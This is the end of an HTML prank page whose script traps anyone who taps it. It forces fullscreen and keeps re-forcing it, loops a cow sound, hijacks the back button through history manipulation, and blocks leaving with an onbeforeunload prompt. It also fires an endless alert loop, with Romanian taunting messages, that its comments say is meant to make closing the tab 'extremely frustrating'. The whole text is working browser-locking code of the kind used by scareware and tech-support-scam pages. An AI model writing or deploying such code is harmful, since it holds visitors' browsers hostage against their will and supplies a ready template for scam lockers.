            trap.style.display = 'flex';

            // 1. Play the moo sound (NOW we have a user gesture ✅)
            audio.play().catch(e => console.log('Audio error:', e));

            // 2. Go fullscreen immediately
            const requestFS = document.documentElement.requestFullscreen ||
                              document.documentElement.webkitRequestFullscreen;
            if (requestFS) {
                requestFS.call(document.documentElement).catch(e => {});
            }

            // 3. Trap back button
            history.pushState(null, null, location.href);
            window.onpopstate = function() {
                history.pushState(null, null, location.href);
            };

            // 4. Try to keep user on the page
            window.onbeforeunload = function() {
                return "CHIAR AI CREZUT CA SCAPI?";
            };

            // 5. Keep sound & fullscreen alive
            setInterval(() => {
                if (audio.paused) audio.play();
                if (!document.fullscreenElement && requestFS) {
                    requestFS.call(document.documentElement).catch(e => {});
                }
            }, 300);

            // 6. Infinite alert loop – makes closing the tab extremely frustrating
            function spamAlerts() {
                alert('NU O TREZESTI TU PE MAMA 🐄');
                // Schedule the next alert immediately after this one is dismissed
                setTimeout(spamAlerts, 50);
            }
            spamAlerts();
        }

        // Trigger on first tap anywhere (idle screen catches it)
        idle.addEventListener('click', startPrank);
        idle.addEventListener('touchstart', startPrank);
    </script>
</body>
</html>
